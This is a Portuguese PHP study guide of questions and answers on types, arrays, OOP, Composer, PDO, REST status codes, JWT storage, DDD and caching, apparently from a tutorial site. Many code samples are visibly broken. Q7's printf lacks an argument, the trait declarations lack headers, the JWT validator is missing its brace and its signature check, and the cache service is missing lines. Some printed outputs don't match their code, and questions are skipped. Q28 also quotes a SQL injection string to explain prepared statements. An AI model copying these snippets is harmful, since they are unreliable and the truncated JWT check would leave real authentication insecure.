Perguntas conceituais — respostas

Q1

O ciclo de uma requisição

Descreva o que acontece entre o navegador pedir /produtos.php e receber o HTML. Por que se diz que o PHP tem um modelo "shared nothing", e que consequência isso tem para variáveis globais?

O servidor web (Apache, ou nginx com PHP-FPM) recebe a requisição, entrega o script ao interpretador, que compila o código para opcodes (o OPcache guarda essa compilação entre requisições), executa, e o que o script imprime vira o corpo da resposta. Ao fim da requisição, tudo é descartado: variáveis, objetos, conexões não persistentes. A requisição seguinte começa do zero, sem compartilhar nada com a anterior. A consequência: uma variável global ou estática não guarda nada entre visitas. Para lembrar algo, é preciso sessão, cookie, banco ou cache. A vantagem é o isolamento: um erro numa requisição não contamina as outras, e escalar é só acrescentar processos.

Q2

Comparação fraca e estrita

Qual o resultado de cada comparação no PHP 8, e por que o === é o padrão recomendado? 0 == "a", "1" == "01", "abc" == 0, null == false, "1e3" == "1000".

  • 0 == "a": false no PHP 8 (era true no PHP 7, quando a string virava 0). Hoje, comparar número com string não numérica compara como strings.
  • "1" == "01": true: duas strings numéricas são comparadas como números.
  • "abc" == 0: false, pela mesma regra do primeiro caso.
  • null == false: true: os dois viram false.
  • "1e3" == "1000": true: "1e3" é uma string numérica (notação científica) e vale 1000.

O === compara valor e tipo, sem conversão: o resultado é previsível sem decorar tabela nenhuma. O == ainda tem casos surpreendentes, como o último, que já causou falhas de segurança em comparações de hashes ("0e123" == "0e456" é true). Para senhas e tokens, nem ===: use hash_equals, que leva o mesmo tempo qualquer que seja a diferença.

Q3

declare(strict_types=1)

O que muda num arquivo com declare(strict_types=1); na chamada somar("5", 3) de uma função function somar(int $a, int $b): int? O efeito vale para o arquivo onde a função foi declarada ou onde foi chamada?

Sem strict_types, o PHP converte "5" para 5 (modo coercitivo) e a chamada funciona; uma string como "5 maçãs" lança TypeError. Com strict_types=1, qualquer tipo diferente do declarado lança TypeError, exceto int passado onde se espera float, que continua permitido. O efeito vale no arquivo onde a chamada acontece: é quem chama que escolhe o modo. Por isso a declaração vai no topo de todo arquivo do projeto, e é comum exigi-la num linter.

Q4

Arrays: lista ou mapa

O array do PHP serve de lista, mapa, pilha e fila. O que array_is_list() verifica, e por que unset($lista[1]) seguido de json_encode($lista) costuma surpreender?

Por dentro, todo array do PHP é um mapa ordenado (chave → valor, lembrando a ordem de inserção). Uma "lista" é só um array cujas chaves são 0, 1, 2… em sequência, e é isso que array_is_list() (PHP 8.1) verifica. O unset($lista[1]) remove o elemento e a chave, sem renumerar: sobram as chaves 0 e 2. O json_encode então não pode gerar um array JSON (que não tem chaves) e gera um objeto: {"0":"a","2":"c"}. Um cliente JavaScript que esperava ["a","c"] quebra. A correção é renumerar com array_values($lista), ou filtrar com array_filter seguido de array_values.

Q5

strlen ou mb_strlen

Por que strlen("ação") devolve 6, e mb_strlen("ação") devolve 4? Que outras funções têm a mesma armadilha?

As funções clássicas de string do PHP (strlen, substr, strtoupper, str_pad, strrev, ucfirst) trabalham com bytes. Em UTF-8, "ç" e "ã" ocupam dois bytes cada: 4 letras, 6 bytes. As funções mb_* (mb_strlen, mb_substr, mb_strtoupper, mb_str_pad no PHP 8.3) entendem a codificação e trabalham com caracteres. Cortar com substr no meio de um caractere de dois bytes produz um texto inválido, que aparece como "�". Regra: para texto em português, use as mb_* sempre que o tamanho ou a posição importarem.

Q6

Exception, Error e Throwable

No PHP 8, qual a diferença entre Exception e Error? Por que catch (Exception $e) não captura uma divisão por zero ou um TypeError?

As duas implementam a interface Throwable, mas são hierarquias separadas. Exception é para condições de erro da aplicação que o código pode prever e tratar (arquivo não encontrado, validação). Error representa erros do motor, geralmente bugs: TypeError, ValueError, DivisionByZeroError, chamada a método inexistente. Como Error não herda de Exception, um catch (Exception $e) não o captura. Isso é proposital: bugs não devem ser engolidos por um tratamento genérico. Para um registro de último nível (o handler que grava o log e mostra a página de erro 500), captura-se Throwable.

Q7

Tabela de tipos

Escreva um programa que percorra os valores 0, "0", "", "0.0", [], null, "false" e 0.0 e mostre, para cada um, o tipo (get_debug_type), se é "verdadeiro" num if e se empty() o considera vazio. Qual deles surpreende?

$valores = [0, "0", "", "0.0", [], null, "false", 0.0];
printf("%-9s %-7s %-6s %s\n", "valor", "tipo", "if", "empty");
foreach ($valores as $v) {
    printf(
        "%-9s %-7s %-6s %s\n",

        get_debug_type($v),
        $v ? "true" : "false",
        empty($v) ? "sim" : "não",
    );
}
valor     tipo    if     empty
0         int     false  sim
"0"       string  false  sim
""        string  false  sim
"0.0"     string  true   não
[]        array   false  sim
null      null    false  sim
"false"   string  true   não

A surpresa é a string "0": é falsa, enquanto "0.0" e "false" são verdadeiras. O PHP trata "0" como falsa por herança dos formulários, onde todo valor chega como texto. Q8

match no lugar de switch

Reescreva com match uma função que classifica o código HTTP: 200 a 299 "sucesso", 301, 302 e 307 "redirecionamento", 404 "não encontrado", 400 a 499 "erro do cliente", 500 a 599 "erro do servidor". Mostre o que acontece com o código 99.

<?php
declare(strict_types=1);

function classificar(int $codigo): string
{
    return match (true) {
        $codigo >= 200 && $codigo <= 299 => "sucesso",
        in_array($codigo, [301, 302, 307], true) => "redirecionamento",
        $codigo === 404 => "não encontrado",
        $codigo >= 400 && $codigo <= 499 => "erro do cliente",
        $codigo >= 500 && $codigo <= 599 => "erro do servidor",
    };
}

foreach ([200, 302, 404, 422, 503, 99] as $c) {
    try {
        echo "$c: ", classificar($c), "\n";
    } catch (\UnhandledMatchError $e) {
        echo "$c: ", $e->getMessage(), "\n";
    }
}
200: sucesso
302: redirecionamento
404: não encontrado
422: erro do cliente
503: erro do servidor
99: 99: Unhandled match case of type bool

O match compara com === (sem conversões), devolve um valor e não tem fall-through: não existe break para esquecer. Quando nenhum braço casa, ele lança UnhandledMatchError, em vez de seguir em silêncio como o switch sem default. A mensagem fala em "of type bool" porque o valor comparado é o true do match (true), e não o código. O match (true) é o idioma para faixas: cada braço é uma condição, e vence a primeira verdadeira, por isso o 404 vem antes da faixa 400–499.

Q9

Funções com tipos, padrões e argumentos nomeados

Escreva function formatarPreco(float $valor, string $moeda = "R$", int $casas = 2, bool $milhar = true): string com number_format no padrão brasileiro. Chame-a com argumentos nomeados, pulando parâmetros. Depois escreva uma função variádica somarTodos(int ...$numeros): int e chame-a espalhando um array.

<?php
declare(strict_types=1);

function formatarPreco(float $valor, string $moeda = "R$", int $casas = 2, bool $milhar = true): string
{
    return $moeda . " " . number_format($valor, $casas, ",", $milhar ? "." : "");
}

function somarTodos(int ...$numeros): int
{
    return array_sum($numeros);
}

echo formatarPreco(1234.5), "\n";
echo formatarPreco(1234.5, milhar: false), "\n";
echo formatarPreco(99.999, casas: 0, moeda: "US$"), "\n";

$itens = [10, 20, 30];
echo somarTodos(...$itens), " | ", somarTodos(), "\n";
R$ 1.234,50
R$ 1234,50
US$ 100
60 | 0

Os argumentos nomeados (PHP 8.0) permitem pular parâmetros com padrão e deixam a chamada legível: milhar: false diz o que faz, enquanto formatarPreco(1234.5, "R$", 2, false) obriga a consultar a assinatura. A contrapartida é que o nome do parâmetro passa a fazer parte da API: renomeá-lo quebra quem chama. O number_format arredonda (99,999 vira 100); para dinheiro de verdade, os valores devem ficar em centavos inteiros ou em bcmath, nunca em float.

Q10

Manipulando arrays sem laços

Dado um array de pedidos (cliente, valor, status), use array_filter, array_map, array_column, array_sum e usort para: (a) os pedidos pagos; (b) o total pago; (c) os nomes dos clientes com pedido pago, sem repetição e em ordem alfabética; (d) os pedidos ordenados por valor decrescente. Use o operador pipe |> do PHP 8.5 em um dos casos.

<?php
declare(strict_types=1);

$pedidos = [
    ["cliente" => "Carla", "valor" => 120.0, "status" => "pago"],
    ["cliente" => "Ana", "valor" => 80.0, "status" => "pendente"],
    ["cliente" => "Bruno", "valor" => 200.0, "status" => "pago"],
    ["cliente" => "Ana", "valor" => 45.5, "status" => "pago"],
];

$pagos = array_filter($pedidos, fn(array $p): bool => $p["status"] === "pago");
echo "(a) ", count($pagos), " pedidos pagos\n";
echo "(b) total pago: ", array_sum(array_column($pagos, "valor")), "\n";

$nomes = $pagos
    |> (fn($ps) => array_column($ps, "cliente"))
    |> array_unique(...)
    |> (function (array $n): array { sort($n); return $n; });
echo "(c) ", implode(", ", $nomes), "\n";

$ordenados = $pedidos;
usort($ordenados, fn(array $a, array $b): int => $b["valor"] <=> $a["valor"]);
echo "(d) ", implode(" > ", array_map(fn($p) => "{$p['cliente']} {$p['valor']}", $ordenados)), "\n";
(a) 3 pedidos pagos
(b) total pago: 365.5
(c) Ana, Bruno, Carla
(d) Bruno 200 > Carla 120 > Ana 80 > Ana 45.5

O array_filter preserva as chaves: $pagos tem as chaves 0, 2 e 3, o que não atrapalha aqui, mas atrapalharia um json_encode (veja a pergunta sobre listas). O pipe |> passa o resultado da esquerda como único argumento da direita: lê de cima para baixo, na ordem em que as coisas acontecem, em vez de sort(array_unique(array_column(...))) de dentro para fora. O sort altera o array por referência e devolve bool, por isso precisa da função anônima. O <=> (nave espacial) devolve -1, 0 ou 1, exatamente o que o usort espera.

Q11

Strings com acentos

Escreva function slug(string $texto): string que transforme "Ação & Reação: o Básico do PHP!" em acao-reacao-o-basico-do-php, removendo acentos com iconv ou com a extensão intl, trocando o que não é letra ou dígito por hífen e eliminando hífens repetidos e nas pontas. Mostre também a diferença entre strtoupper e mb_strtoupper no mesmo texto.

<?php
declare(strict_types=1);

function slug(string $texto): string
{
    $semAcento = transliterator_transliterate("Any-Latin; Latin-ASCII; Lower()", $texto);
    $slug = preg_replace("/[^a-z0-9]+/", "-", $semAcento);
    return trim($slug, "-");
}

$titulo = "Ação & Reação: o Básico do PHP!";
echo slug($titulo), "\n";
echo slug("  Coração   São João  "), "\n";
echo "strtoupper:    ", strtoupper("ação"), "\n";
echo "mb_strtoupper: ", mb_strtoupper("ação"), "\n";
echo "strlen: ", strlen("ação"), " | mb_strlen: ", mb_strlen("ação"), "\n";
acao-reacao-o-basico-do-php
coracao-sao-joao
strtoupper:    AçãO
mb_strtoupper: AÇÃO
strlen: 6 | mb_strlen: 4

O transliterator_transliterate (extensão intl) converte qualquer escrita para ASCII de forma confiável; o iconv("UTF-8", "ASCII//TRANSLIT", ...) também funciona, mas o resultado depende da biblioteca C e do locale do servidor. O strtoupper, desde o PHP 8.2, só converte letras ASCII e deixa os bytes de "ç" e "ã" intactos, por isso sai "AçãO". É o mesmo tipo de função que gera os slugs das URLs deste site.

Q12

Exceções em camadas

Escreva uma função lerConfiguracao(string $arquivo): array que lance uma exceção própria ConfiguracaoException quando o arquivo não existe ou o JSON é inválido, encadeando a exceção original (previous). Use json_decode com JSON_THROW_ON_ERROR. No código que chama, mostre a mensagem e a causa, e use finally.

<?php
declare(strict_types=1);

final class ConfiguracaoException extends RuntimeException {}

function lerConfiguracao(string $arquivo): array
{
    if (!is_file($arquivo)) {
        throw new ConfiguracaoException("arquivo de configuração não encontrado: $arquivo");
    }
    try {
        return json_decode(file_get_contents($arquivo), true, flags: JSON_THROW_ON_ERROR);
    } catch (JsonException $e) {
        throw new ConfiguracaoException("configuração inválida em $arquivo", previous: $e);
    }
}

file_put_contents("ok.json", '{"site": "Livraria", "itensPorPagina": 12}');
file_put_contents("quebrado.json", '{"site": "Livraria",');

foreach (["ok.json", "quebrado.json", "nao-existe.json"] as $arq) {
    try {
        $cfg = lerConfiguracao($arq);
        echo "$arq: {$cfg['site']}, {$cfg['itensPorPagina']} por página\n";
    } catch (ConfiguracaoException $e) {
        echo "$arq: {$e->getMessage()}";
        echo $e->getPrevious() ? " (causa: {$e->getPrevious()->getMessage()})\n" : "\n";
    } finally {
        echo "  -> verificado\n";
    }
}
ok.json: Livraria, 12 por página
  -> verificado
quebrado.json: configuração inválida em quebrado.json (causa: Syntax error)
  -> verificado
nao-existe.json: arquivo de configuração não encontrado: nao-existe.json
  -> verificado

O JSON_THROW_ON_ERROR (PHP 7.3) faz o json_decode lançar em vez de devolver null em silêncio, o que eliminava a dúvida entre "o JSON era null" e "o JSON estava quebrado". Encadear com previous preserva a causa técnica para o log, enquanto a mensagem da exceção própria fala a língua de quem chama.

Q13

Visibilidade e encapsulamento

Qual a diferença entre public, protected e private? Por que expor uma propriedade public float $saldo numa classe Conta é um problema, e como o PHP 8.4 resolve isso com visibilidade assimétrica?

public é acessível de qualquer lugar; protected, da própria classe e das filhas; private, só da própria classe. Com public float $saldo, qualquer linha do sistema pode fazer $conta->saldo = -1000, sem passar pelas regras de saque e depósito: a classe não consegue proteger a própria invariante. A solução clássica é private com um getter. O PHP 8.4 permite declarar a leitura e a escrita com visibilidades diferentes: public private(set) float $saldo. Todos leem $conta->saldo direto, sem getter, mas só a própria classe altera.

Q14

Herança, interface ou trait

Para cada caso, escolha entre herança, interface e trait: (a) várias classes de pagamento (Pix, cartão, boleto) que precisam de um método pagar(), com implementações totalmente diferentes; (b) as classes Produto, Pedido e Cliente, que precisam dos mesmos métodos criadoEm() e atualizadoEm() com o mesmo código; (c) Administrador, que é um Usuario com permissões a mais.

  • (a) Interface MeioDePagamento: o que se compartilha é o contrato, não o código.
  • (b) Trait TemTimestamps: é código idêntico em classes sem relação "é um" entre si. A trait é colada na classe pelo compilador, como um "copiar e colar" com verificação.
  • (c) Herança: o administrador é um usuário, e herda estado e comportamento.

A regra prática é preferir composição e interfaces, e usar herança só quando a relação "é um" for verdadeira e estável. Traits são cômodas, mas escondem dependências: uma trait que usa $this->id só funciona em classes que têm esse id.

Q15

O que o Composer resolve

O que fazem o composer.json, o composer.lock e o vendor/autoload.php? Por que o composer.lock vai para o repositório de uma aplicação, e o vendor/ não?

  • composer.json: declara as dependências e as faixas de versão aceitas ("monolog/monolog": "^3.0"), além do mapa de autoload (PSR-4).
  • composer.lock: registra as versões exatas instaladas, com os hashes. O composer install instala exatamente o que está nele; o composer update recalcula as versões dentro das faixas e o reescreve.
  • vendor/autoload.php: o autoloader gerado, que carrega cada classe sob demanda a partir do namespace, sem nenhum require manual.

O .lock é versionado para que todos (os colegas, o CI e a produção) instalem as mesmas versões. O vendor/ não é versionado porque é reproduzível a partir do .lock (composer install), é grande e muda a cada atualização.

Q16

Singleton: quando não usar

O Singleton garante uma única instância de uma classe, como a conexão com o banco. Por que ele é considerado um antipadrão na maioria dos casos, e qual a alternativa?

O Singleton é um estado global disfarçado: qualquer código pode chamar Banco::instancia() de qualquer lugar, então as dependências de uma classe ficam escondidas dentro dos métodos dela, e não visíveis no construtor. Isso dificulta os testes (não dá para trocar o banco por um falso sem truques), acopla o código à classe concreta e mantém estado entre testes que deveriam ser independentes. A alternativa é a injeção de dependência: a classe recebe o PDO pelo construtor, e um contêiner (ou o próprio index.php) cria uma instância só e a repassa. "Uma instância só" vira uma decisão de configuração, e não uma regra imposta pela classe.

Q17

Uma conta com regras

Escreva final class Conta com o titular, o saldo (public private(set), PHP 8.4) e os métodos depositar e sacar, que recusam valores não positivos e saques acima do saldo com exceções. Trabalhe em centavos (int). Mostre que tentar alterar o saldo de fora causa um Error.

<?php
declare(strict_types=1);

final class Conta
{
    public private(set) int $saldoCentavos = 0;

    public function __construct(public readonly string $titular) {}

    public function depositar(int $centavos): void
    {
        if ($centavos <= 0) {
            throw new InvalidArgumentException("depósito deve ser positivo");
        }
        $this->saldoCentavos += $centavos;
    }

    public function sacar(int $centavos): void
    {
        if ($centavos <= 0) {
            throw new InvalidArgumentException("saque deve ser positivo");
        }
        if ($centavos > $this->saldoCentavos) {
            throw new DomainException("saldo insuficiente");
        }
        $this->saldoCentavos -= $centavos;
    }
}

$c = new Conta("Ana");
$c->depositar(10_000);
$c->sacar(2_550);
printf("%s tem R$ %s\n", $c->titular, number_format($c->saldoCentavos / 100, 2, ",", "."));

foreach ([fn() => $c->sacar(100_000), fn() => $c->depositar(-5), fn() => $c->saldoCentavos = 1] as $tentativa) {
    try {
        $tentativa();
    } catch (Throwable $e) {
        echo get_class($e), ": ", $e->getMessage(), "\n";
    }
}
Ana tem R$ 74,50
DomainException: saldo insuficiente
InvalidArgumentException: depósito deve ser positivo
Error: Cannot modify private(set) property Conta::$saldoCentavos from global scope

O DomainException (regra de negócio) e o InvalidArgumentException (argumento inválido) permitem a quem chama tratar os dois casos de forma diferente. O Error da terceira tentativa é o motor do PHP recusando a escrita: não há como o código de fora contornar a regra. A promoção de propriedade no construtor (public readonly string $titular) declara e atribui numa linha só.

Q18

Interfaces e um padrão Strategy

Defina interface CalculoFrete { public function calcular(float $pesoKg, string $uf): float; } e três estratégias: FreteFixo, FretePorPeso (R$ 5 por kg, mínimo R$ 12) e FreteGratisAcimaDe (um decorator que recebe outra estratégia e zera o frete quando o valor do pedido passa de um limite). Calcule o frete de dois pedidos com cada uma.

<?php
declare(strict_types=1);

interface CalculoFrete
{
    public function calcular(float $pesoKg, string $uf, float $valorPedido): float;
}

final class FreteFixo implements CalculoFrete
{
    public function __construct(private float $valor) {}

Q21

Enums com comportamento

O que um enum StatusPedido: string (backed enum) oferece a mais que um conjunto de constantes const PAGO = 'pago'? Para que servem from e tryFrom?

Com constantes, um parâmetro string $status aceita qualquer texto, inclusive "pgo". Com StatusPedido $status, só os casos do enum passam, e o erro aparece no tipo, verificado pelo PHP. Um enum também pode ter métodos ($status->rotulo(), $status->podeIrPara($outro)), implementar interfaces e listar os casos com cases(). O backed enum associa cada caso a um valor escalar (case Pago = 'pago';), que é o que vai para o banco e para o JSON. O from('pago') converte de volta e lança ValueError para valor desconhecido; o tryFrom devolve null. Use tryFrom para dados externos (formulário, JSON), tratando o null, e from onde um valor inválido é um bug.

Q22

readonly e imutabilidade

O que garante uma propriedade readonly? Por que um objeto readonly que contém um array de objetos ainda pode mudar "por dentro"? O que o PHP 8.5 trouxe para criar cópias alteradas?

Uma propriedade readonly só pode ser inicializada uma vez, de dentro da classe (normalmente no construtor); qualquer nova atribuição lança Error. A garantia é rasa: se a propriedade guarda um objeto, a referência é fixa, mas o objeto apontado continua mutável ($pedido->cliente->email = '...' funciona se Cliente não for imutável). Um array readonly não pode ser alterado, mas os objetos dentro dele podem. Para a imutabilidade valer de verdade, os objetos internos também precisam ser imutáveis. Para criar uma cópia com um campo diferente, era preciso o padrão withX() reconstruindo o objeto; o PHP 8.5 trouxe o clone($objeto, ['preco' => 10]), que clona e altera propriedades na mesma operação, inclusive as readonly.

Q23

Property hooks

O PHP 8.4 trouxe os property hooks. Mostre como uma propriedade public string $email pode normalizar o valor (minúsculas, sem espaços) a cada escrita, sem getter nem setter. Que vantagem isso tem sobre os métodos setEmail()?

public string $email {
    set(string $valor) {
        $this->email = strtolower(trim($valor));
    }
}

O hook set roda a cada atribuição ($cliente->email = " Ana@X.com "), e quem usa a classe continua escrevendo e lendo a propriedade normalmente. A vantagem sobre setEmail() é que a classe pode começar com uma propriedade pública simples e ganhar a regra depois, sem mudar nenhum código que a usa. Antes dos hooks, a prudência obrigava a escrever getters e setters desde o primeiro dia, por precaução. Iteradores e Countable

<?php
declare(strict_types=1);

final class Carrinho implements IteratorAggregate, Countable
{
    /** @var array<string, int> */
    private array $itens = [];

    public function adicionar(string $titulo, int $qtd = 1): void
    {
        $this->itens[$titulo] = ($this->itens[$titulo] ?? 0) + $qtd;
    }

    public function getIterator(): Generator
    {
        yield from $this->itens;
    }

    public function count(): int
    {
        return array_sum($this->itens);
    }

    public function itensAcimaDe(int $qtd): Generator
    {
        foreach ($this->itens as $titulo => $q) {
            echo "  (examinando $titulo)\n";
            if ($q > $qtd) {
                yield $titulo => $q;
            }
        }
    }
}

$c = new Carrinho();
$c->adicionar("Vidas Secas");
$c->adicionar("Iracema", 3);
$c->adicionar("Vidas Secas", 2);

foreach ($c as $titulo => $qtd) {
    echo "$titulo: $qtd\n";
}
echo "total de exemplares: ", count($c), "\n";

$gerador = $c->itensAcimaDe(2);
echo "gerador criado, nada examinado ainda\n";
foreach ($gerador as $titulo => $qtd) {
    echo "acima de 2: $titulo ($qtd)\n";
    break;  // parou no primeiro: o resto nunca é examinado
}

Iracema: 3
total de exemplares: 6
gerador criado, nada examinado ainda
  (examinando Vidas Secas)
acima de 2: Vidas Secas (3)

Traits com conflito e método abstrato

Duas traits, Registravel e Notificavel, têm um método enviar(). Use as duas na classe Pedido, resolvendo o conflito com insteadof e as. Faça uma das traits exigir, por um método abstrato, que a classe tenha identificador(): string.

<?php

{
    abstract public function identificador(): string;  // quem usa a trait precisa fornecer

    public function enviar(): string
    {
        return "log: " . $this->identificador() . " registrado";
    }
}

{
    public function enviar(): string
    {
        return "e-mail: aviso enviado";
    }
}

{
    use Registravel, Notificavel {
        Registravel::enviar insteadof Notificavel;  // enviar() é o da Registravel
        Notificavel::enviar as notificar;           // o outro continua disponível com outro nome
    }

}

Q28

Prepared statements

Explique por que um prepared statement impede SQL injection mesmo quando o valor contém aspas. A opção PDO::ATTR_EMULATE_PREPARES muda essa garantia?

No prepared statement, o comando (SELECT * FROM livros WHERE autor = ?) e os valores são enviados separadamente: o banco analisa e planeja o comando antes de conhecer os valores, que entram depois como dados, nunca como SQL. Um valor ' OR '1'='1 é procurado literalmente como nome de autor. Com ATTR_EMULATE_PREPARES ligado (o padrão do driver MySQL), o PDO monta o comando no lado do PHP, escapando os valores com as regras do conjunto de caracteres da conexão. Continua seguro desde que o charset esteja na DSN (charset=utf8mb4), e não definido depois com SET NAMES. Desligar a emulação usa os prepared statements nativos do servidor e devolve números com o tipo certo, em vez de strings.

Q29

Repository

O que o padrão Repository esconde do resto da aplicação? Por que o método LivroRepository::buscarPorAutor(string $autor): array é melhor do que espalhar o SQL pelos controladores?

O Repository esconde como os objetos são guardados e recuperados: SQL, tabelas, joins, conversão de linha para objeto. O resto da aplicação pede coleções de objetos do domínio, numa linguagem do negócio (buscarPorAutor). Com o SQL espalhado, mudar uma coluna exige caçar todas as consultas; a mesma consulta aparece repetida com pequenas diferenças; e testar um controlador exige um banco. Com o Repository, há um lugar só para cada consulta, e uma interface (LivroRepositoryInterface) permite trocar a implementação por uma em memória nos testes. É exatamente o que este site faz em app/Repositories/.

Q30

Migrations

Por que um projeto versiona as mudanças de esquema como migrations numeradas, em vez de manter só um schema.sql atualizado à mão? O que uma tabela de controle registra?

O schema.sql descreve o estado final, mas um banco em produção já tem dados e está num estado anterior: para chegar ao novo, é preciso saber exatamente quais alterações faltam aplicar. As migrations são passos ordenados (007_cria_downloads.sql, 008_adiciona_slug.sql), versionados junto com o código: cada ambiente (a máquina de cada desenvolvedor, o CI, a produção) aplica os que ainda não aplicou, na mesma ordem, e todos chegam ao mesmo esquema. A tabela de controle (migrations) registra quais já foram aplicadas e quando. Uma migration já aplicada em produção nunca é editada: corrige-se com uma nova.

Q31

Status HTTP de uma API

Que código HTTP a API da livraria deve devolver em cada caso, e por quê? (a) livro criado; (b) livro removido; (c) JSON malformado no corpo; (d) campos válidos como JSON, mas preço negativo; (e) token ausente; (f) token válido de um usuário sem permissão; (g) livro inexistente.

  • (a) 201 Created, com o cabeçalho Location apontando para o novo recurso.
  • (b) 204 No Content: deu certo e não há corpo a devolver.
  • (c) 400 Bad Request: a requisição nem pôde ser entendida.
  • (d) 422 Unprocessable Content: a requisição foi entendida, mas viola as regras (muitas APIs usam 400 para os dois casos, o que também é aceitável, se for consistente).
  • (e) 401 Unauthorized: "não sei quem você é" (o nome é histórico: significa não autenticado).
  • (f) 403 Forbidden: "sei quem você é, e você não pode".
  • (g) 404 Not Found.

Devolver 200 com {"erro": ...} no corpo quebra proxies, caches, monitoramento e clientes, que olham o código para decidir o que fazer.

Q32

Onde guardar o JWT no navegador

Uma SPA recebe um JWT após o login. Compare guardá-lo no localStorage e num cookie HttpOnly; Secure; SameSite=Strict, quanto a XSS e CSRF.

  • **localStorage: qualquer JavaScript da página consegue lê-lo. Uma falha de XSS** (um script injetado) rouba o token e o envia para o atacante, que passa a agir como o usuário de qualquer lugar, até o token expirar. Em compensação, não há CSRF: o navegador não envia o localStorage sozinho.
  • **Cookie HttpOnly: o JavaScript não consegue lê-lo, e o XSS não o rouba (embora ainda possa fazer requisições em nome do usuário enquanto a página estiver aberta). Como o navegador envia o cookie sozinho, volta o risco de CSRF**, que o SameSite=Strict (ou Lax) e um token antiforgery resolvem.

Para aplicações web, o cookie HttpOnly é a opção mais segura. Em qualquer caso, tokens de curta duração limitam o estrago.

<?php
declare(strict_types=1);

function b64url(string $s): string { return rtrim(strtr(base64_encode($s), '+/', '-_'), '='); }
function b64url_dec(string $s): string { return base64_decode(strtr($s, '-_', '+/'), true) ?: ''; }

function jwt_criar(array $claims, string $segredo): string
{
    $cab = b64url(json_encode(['alg' => 'HS256', 'typ' => 'JWT']));
    $corpo = b64url(json_encode($claims));
    $assinatura = b64url(hash_hmac('sha256', "$cab.$corpo", $segredo, true));
    return "$cab.$corpo.$assinatura";
}

function jwt_validar(string $token, string $segredo, int $agora): array
{
    $partes = explode('.', $token);
    if (count($partes) !== 3) {
        throw new UnexpectedValueException('formato inválido');
    }
    [$cab, $corpo, $assinatura] = $partes;
    $cabecalho = json_decode(b64url_dec($cab), true);
    if (($cabecalho['alg'] ?? null) !== 'HS256') {
        throw new UnexpectedValueException('algoritmo não aceito');  // nunca confie no "alg" do token

    $esperada = b64url(hash_hmac('sha256', "$cab.$corpo", $segredo, true));

        throw new UnexpectedValueException('assinatura inválida');
    }
    $claims = json_decode(b64url_dec($corpo), true);
    if (($claims['exp'] ?? 0) <= $agora) {
        throw new UnexpectedValueException('token expirado');
    }
    return $claims;
}

Q39

Inversão de dependência

O princípio da inversão de dependência (o "D" do SOLID) diz que módulos de alto nível não devem depender de módulos de baixo nível, mas de abstrações. Mostre o antes e o depois com um RelatorioDeVendas que hoje faz new MySqlVendas() dentro do construtor.

Antes, a regra de negócio (alto nível) depende do detalhe (baixo nível):

class RelatorioDeVendas {
    private MySqlVendas $vendas;
    public function __construct() { $this->vendas = new MySqlVendas(); }
}

Depois, os dois dependem de uma abstração, que pertence ao lado do negócio:

interface FonteDeVendas { public function doMes(int $ano, int $mes): array; }

final class RelatorioDeVendas {
    public function __construct(private FonteDeVendas $vendas) {}
}

final class MySqlVendas implements FonteDeVendas { /* ... */ }

O relatório pode ser testado com uma FonteDeVendas em memória, e trocar o MySQL pelo PostgreSQL (ou por uma API) não toca nele. Quem decide qual implementação usar é a "raiz de composição" da aplicação: o bootstrap, o contêiner de dependências.

Q40

Entidade, objeto de valor e agregado

No DDD, qual a diferença entre uma entidade e um objeto de valor? O que é um agregado, e por que os itens de um pedido só devem ser alterados por meio do próprio Pedido?

Uma entidade tem identidade que persiste ao longo do tempo, mesmo que os dados mudem: o pedido 123 continua sendo o 123 depois de pago. Um objeto de valor é definido só pelos seus atributos, é imutável e substituível: dois Preco(4990, 'BRL') são o mesmo preço. Um agregado é um grupo de objetos tratado como unidade de consistência, com uma entidade raiz como única porta de entrada: o Pedido e os seus ItemPedido. Se o código pudesse alterar um item diretamente, a regra "um pedido pago não muda" ou "o total sempre bate com os itens" poderia ser violada sem o pedido saber. Passando por $pedido->adicionarItem(...), a raiz verifica as regras a cada alteração, e o repositório salva e carrega o agregado inteiro.

Q41

Por que uma fila

Ao finalizar o pedido, a loja precisa gerar a nota fiscal (3 s, num serviço externo) e enviar o e-mail (1 s). Por que fazer isso numa fila, processada por um worker, em vez de durante a requisição? O que é uma dead letter queue?

Na requisição, o cliente esperaria pelo menos 4 s olhando para a tela, e uma falha do serviço de notas (fora do ar, lento) derrubaria a finalização do pedido, que já tinha sido paga. Com a fila, a requisição grava o pedido, enfileira os jobs e responde em milissegundos; o worker processa no seu ritmo, e uma falha vira uma nova tentativa, não um erro para o cliente. Picos de pedidos são absorvidos pela fila, sem derrubar o servidor web. A dead letter queue recebe os jobs que falharam mais vezes do que o limite: eles saem do fluxo normal para não serem tentados para sempre e ficam guardados para alguém investigar e reprocessar.

Q42

Cache-aside

Descreva o padrão cache-aside com Redis para a página de um livro. O que acontece quando o preço muda, e por que o TTL é uma rede de segurança e não a estratégia principal?

Na leitura: procura livro:42 no Redis. Se existe (hit), usa; se não (miss), busca no banco, grava no Redis com um TTL e usa. A aplicação é responsável por encher o cache, daí o nome. Quando o preço muda, o código que grava no banco apaga a chave livro:42 (é mais seguro apagar que atualizar: a próxima leitura busca o valor certo no banco). O TTL garante que, se algum caminho de escrita esquecer de invalidar, o dado velho tenha prazo para morrer. Mas, contando só com ele, o preço errado aparece até o TTL expirar, o que em loja pode significar vender pelo preço antigo.

Cache-aside com interface

<?php
declare(strict_types=1);

interface Cache
{
    public function get(string $chave): mixed;
    public function set(string $chave, mixed $valor, int $ttl): void;
    public function delete(string $chave): void;
}

final class CacheEmMemoria implements Cache
{
    private array $itens = [];
    public function __construct(private Closure $agora) {}
    public function get(string $chave): mixed
    {
        [$valor, $expira] = $this->itens[$chave] ?? [null, 0];
        return $expira > ($this->agora)() ? $valor : null;
    }
    public function set(string $chave, mixed $valor, int $ttl): void
    {
        $this->itens[$chave] = [$valor, ($this->agora)() + $ttl];
    }
    public function delete(string $chave): void
    {
        unset($this->itens[$chave]);
    }
}

final class BancoFalso
{
    public int $consultas = 0;
    public array $precos = [42 => 4990];
    public function preco(int $id): int { $this->consultas++; return $this->precos[$id]; }
}

final class LivroService
{
    public function __construct(private Cache $cache, private BancoFalso $banco) {}

    public function preco(int $id): int

        if ($valor === null) {
            $valor = $this->banco->preco($id);
            $this->cache->set($chave, $valor, ttl: 300);
        }
        return $valor;
    }

    public function alterarPreco(int $id, int $novo): void
    {
        $this->banco->precos[$id] = $novo;
        $this->cache->delete("livro:$id:preco");  // invalida: a próxima leitura busca o novo
    }
}

Q45

O que o PostgreSQL tem a mais

Cite três recursos do PostgreSQL que o MySQL não tem ou tem de forma limitada, e um caso de uso de cada um numa livraria.

